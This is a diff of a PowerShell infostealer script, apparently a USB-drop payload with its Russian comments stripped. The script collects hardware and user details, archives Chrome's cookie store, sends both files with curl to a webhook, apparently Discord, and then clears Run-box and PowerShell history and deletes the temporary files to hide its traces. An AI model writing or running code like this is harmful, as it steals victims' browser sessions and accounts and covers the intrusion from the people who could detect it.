@@ -2,26 +2,30 @@
 
 $ComputerName = Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty Name
 $UserName = Get-ChildItem Env:UserName | Select-Object -ExpandProperty Value
-$CoresCount = (Get-WmiObject -Class Win32_Processor | Measure-Object -Property NumberOfLogicalProcessors -Sum).Sum
+# CPU
 $ProcessorName = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name
-$GPUName = Get-WmiObject -Class Win32_VideoController | Select-Object -First 1 -ExpandProperty Name
+$CoresCount = (Get-WmiObject -Class Win32_Processor | Measure-Object -Property NumberOfLogicalProcessors -Sum).Sum
+# RAM
+$ram = Get-CimInstance Win32_PhysicalMemory
+$RamManufacturer = $ram[0].Manufacturer.Trim()
+$RamModel = $ram[0].PartNumber.Trim()
+$RamSpeed = $ram[0].Speed
+$RamCount = [math]::Round((Get-CimInstance win32_physicalmemory | Measure-Object -Property capacity -Sum | Select-Object -ExpandProperty Sum) / 1GB, 2)
+# GPU
+$gpu = Get-CimInstance Win32_VideoController
+$GpuName = $gpu.Name
+$GpuRam = [math]::Round(($gpu.AdapterRAM / 1GB), 2)
+# MotherBoard
+$motherboard = Get-CimInstance Win32_BaseBoard
+$MotherboardName = $motherboard.Manufacturer
+$MotherboardModel = $motherboard.Product
 
-$wifiProfiles = "Info PC $ComputerName" + "`n" + "Username: $UserName" + "`n" + "CPU: $ProcessorName" + "`n" + "Cores: $CoresCount" + "`n" + "GPU: $GPUName"
+$cookiesPath = "C:\Users\Towa\AppData\Local\Google\Chrome\User Data\Default\Network\*"
+if ($cookiesPath) {Compress-Archive -Path $cookiesPath -DestinationPath "C:\Windows\Temp\cookies.zip" -Force}
 
-# Задайте переменную со списком файлов для архивации
-$cookiesPath = "C:\Users\Towa\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
-if (Test-Path $cookiesPath) {
-    $cookiesFiles = Get-ChildItem -Path $cookiesPath -Filter *.* -Recurse | Select-Object -ExpandProperty FullName
-    if ($cookiesFiles) {
-        Compress-Archive -Path $cookiesFiles -DestinationPath "C:\Windows\Temp\cookies.zip" -Force
-    } else {
-        Write-Output "Нет файлов Cookies для архивирования."
-    }
-} else {
-    Write-Output "Папка Cookies не найдена."
-}
+$info = "==============================`nComputer Name: $ComputerName`nUser Name: $UserName`nCPU:`n   Name: $ProcessorName`n   Cores: $CoresCount`nRAM:`n   Name: $RamManufacturer`n   Model: $RamModel`n   Speed: $RamSpeed MHz`n   GB: $RamCount`nGPU:`n   Name: $gpuName`n   RAM: $GpuRam GB`nMotherBoard:`n   Name: $MotherboardName`n   Model: $MotherboardModel`n=============================="
 
-$wifiProfiles > "C:\Windows\Temp\info.txt"
+$info > "C:\Windows\Temp\info.txt"
 
 ############################################################################################################################################################
 
@@ -40,45 +44,16 @@ $files = @("C:\Windows\Temp\info.txt", "C:\Windows\Temp\cookies.zip")
 $fileList = ''
 $i = 1
 
-foreach ($file in $files) {
-    if (Test-Path $file) {
-        # Файл существует, добавляем его в список для отправки с нумерацией
-        $fileList += "-F `"file$i=@$file`" "
-        $i = $i + 1
-    } else {
-        # Файл не существует, печатаем сообщение об ошибке
-        Write-Output "Файл $file не найден."
-    }
-}
+$files | ForEach-Object { if (Test-Path $_) { $fileList += "-F `"file$i=@$_`" "; $i += 1 } }
 
-# Отправляем файлы используя cURL
 if ($fileList) {
     $curlCommand = "curl.exe $fileList $hookurl"
     Invoke-Expression $curlCommand
-} else {
-    Write-Output "Нет файлов для отправки."
 }
 }
 
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "C:\Windows\Temp\info.txt"}
 
- 
+function Clean-Exfil {reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f;Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue}; Clean-Exfil
 
-# Очистить следы
-
-function Clean-Exfil {
-
-# delete run box history
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
-
-# Delete powershell history
-Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-
-}
-
-# Запустить скрипт очистки
-
-Clean-Exfil
-
-RI "C:\Windows\Temp\info.txt"
-RI "C:\Windows\Temp\cookies.zip"
+RI "C:\Windows\Temp\info.txt"; RI "C:\Windows\Temp\cookies.zip"
